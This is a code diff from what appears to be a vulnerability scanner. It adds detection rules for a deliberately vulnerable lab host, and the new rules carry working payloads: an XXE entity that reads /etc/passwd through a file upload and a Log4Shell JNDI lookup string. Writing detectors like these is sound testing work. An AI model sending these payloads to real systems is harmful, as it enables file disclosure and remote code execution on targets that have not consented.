@@ -6799,6 +6799,44 @@ const burpbountyXxeParseLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyXxeUploadLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const uploadUrl = new URL("/xxe/upload", ctx.origin).toString();
+  const boundary = `----ThugirXxe${Date.now().toString(36)}`;
+  const xmlPayload =
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="xmlfile"; filename="probe.xml"',
+    "Content-Type: application/xml",
+    "",
+    xmlPayload,
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+    maxBytes: 8192
+  });
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const xxeOk =
+    /root:x:0:0:/.test(doc.body) &&
+    /\/bin\/(?:bash|sh|nologin)/.test(doc.body) &&
+    (/<foo>/i.test(doc.body) || /<pre>/i.test(doc.body));
+  if (!xxeOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: uploadUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab POST /xxe/upload parses uploaded XML with external entities and returns /etc/passwd — XXE file-upload profile oracle"
+    }
+  };
+};
+
 const burpbountyCorsLiveOracle: Rule = async (ctx) => {
   if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
   const probeOrigin = "https://evil-cors-probe.example";
@@ -6974,6 +7012,35 @@ const burpbountyRceEvalLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyRceLog4jLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/rce/log4j", ctx.origin).toString();
+  const jndiPayload = "${jndi:ldap://127.0.0.1/a}";
+  const body = new URLSearchParams({ search: jndiPayload }).toString();
+  const doc = await ctx.probe.get(probeUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096
+  });
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const logged =
+    /<h1>\s*Logged\s*<\/h1>/i.test(doc.body) &&
+    /jndi:ldap/i.test(doc.body) &&
+    /Query:/i.test(doc.body);
+  if (!logged) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: probeUrl,
+      payload: jndiPayload,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab POST /rce/log4j logs attacker JNDI lookup strings without sanitization — Log4Shell profile oracle"
+    }
+  };
+};
+
 const burpbountyDrupalUserDisclosureLiveOracle: Rule = async (ctx) => {
   if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/drupal/user/1", ctx.origin).toString();
@@ -7143,7 +7210,6 @@ const burpbountySqliTimeLiveOracle: Rule = async (ctx) => {
   const t1 = Date.now();
   const sleepDoc = await ctx.probe.get(sleepUrl.toString(), { maxBytes: 4096, timeoutMs: 10000 });
   const sleepMs = Date.now() - t1;
-  if (sleepDoc.status < 200 || sleepDoc.status >= 500) return NEGATIVE;
   const delayOk = sleepMs >= baselineMs + 2500 && sleepMs >= 2800;
   if (!delayOk) return NEGATIVE;
   return {
@@ -32063,6 +32129,7 @@ export const RULES: Record<string, Rule> = {
   burpbountyDomXssLiveOracle,
   burpbountyRcePingLiveOracle,
   burpbountyXxeParseLiveOracle,
+  burpbountyXxeUploadLiveOracle,
   burpbountyCorsLiveOracle,
   burpbountyPtReadLiveOracle,
   burpbountyCrlfSetLiveOracle,
@@ -32070,6 +32137,7 @@ export const RULES: Record<string, Rule> = {
   burpbountySqliSearchLiveOracle,
   burpbountyAiDisclosureLiveOracle,
   burpbountyRceEvalLiveOracle,
+  burpbountyRceLog4jLiveOracle,
   burpbountyDrupalUserDisclosureLiveOracle,
   burpbountyPassiveSecretsLiveOracle,
   burpbountySsrfProxyLiveOracle,
